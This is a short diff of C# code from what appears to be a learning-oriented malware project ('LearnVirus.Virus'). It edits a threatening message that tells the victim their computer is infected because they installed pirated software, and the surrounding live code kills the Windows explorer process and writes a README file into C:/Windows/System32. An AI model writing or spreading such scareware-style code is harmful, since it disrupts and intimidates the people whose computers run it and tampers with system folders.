@@ -15,10 +15,10 @@ namespace LearnVirus.Virus
                 "",
                 "Your part is done now. And your computer is now infected by the best virus of all-time.",
                 "Oh, forgot to tell you don't even try to taskkill this process or restart your PC.",
-                "As... it's already to late. You installed pirated software and now the Windows boot sector want a break.",
+                "As... it's already to late. You installed pirated software and now you'll meet the consequences.",
                 "",
                 "But, Good luck saving your computer",
-                "/Hacker. 76");
+                "/Unknown hacker");
             Process[] proc = Process.GetProcessesByName("explorer");
             proc[0].Kill();
             System.IO.File.WriteAllText(@"C:/Windows/System32/README", infotext);
